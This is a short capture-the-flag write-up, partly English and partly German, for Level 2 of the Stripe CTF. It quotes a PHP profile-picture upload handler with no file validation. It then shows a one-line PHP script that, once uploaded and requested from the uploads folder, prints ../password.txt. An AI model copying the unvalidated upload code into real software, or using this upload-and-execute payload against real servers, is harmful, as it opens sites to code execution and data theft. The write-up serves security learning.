LEVEL 02
========

Simple file upload application. Filetypes were not checked, you can
upload anything... so let's upload a little PHP-Script to read
../password.txt.

---

You are now on Level 2, the Social Network. Excellent work so far! Social Networks are all the rage these days, so we decided to build one for CTF. Please fill out your profile at https://level02-2.stripe-ctf.com/user-XXXX. You may even be able to find the password for Level 3 by doing so.

The code for the Social Network can be obtained from git clone https://level02-2.stripe-ctf.com/user-XXXX/level02-code, and is also included below.

---

In Level 2 könnt ihr in einem "sozialen Netzwerk" ein Profilbild hochladen. Das funktioniert super!

    <?php
      session_start();

      if ($_FILES["dispic"]["error"] > 0) {
        echo "<p>Error: " . $_FILES["dispic"]["error"] . "</p>";
      }
      else
      {
        $dest_dir = "uploads/";
        $dest = $dest_dir . basename($_FILES["dispic"]["name"]);
        $src = $_FILES["dispic"]["tmp_name"];
        if (move_uploaded_file($src, $dest)) {
          $_SESSION["dispic_url"] = $dest;
          chmod($dest, 0644);
          echo "<p>Successfully uploaded your display picture.</p>";
        }
      }

      $url = "https://upload.wikimedia.org/wikipedia/commons/f/f8/" .
             "Question_mark_alternate.svg";
      if (isset($_SESSION["dispic_url"])) {
        $url = $_SESSION["dispic_url"];
      }
    ?>

Die oben stehende Routine ist für den Upload eurer Bilddatei verantwortlich. Auffällig ist hier, dass es keinerlei Validierung der Datei gibt. Ihr könnt im Endeffekt jede beliebige Datei hochladen. Wir wollen dringend die Datei _./password.txt_ auslesen! Was tun? Ein winziges PHP-Script schreiben, dass die anvisierte Datei öffnet und uns im Browser ausgibt.

    <?php
      echo trim(file_get_contents("../password.txt"));
    ?>

Danach einfach _uploads/eure_php.php_ ausführen, schon kennen wir das Passwort!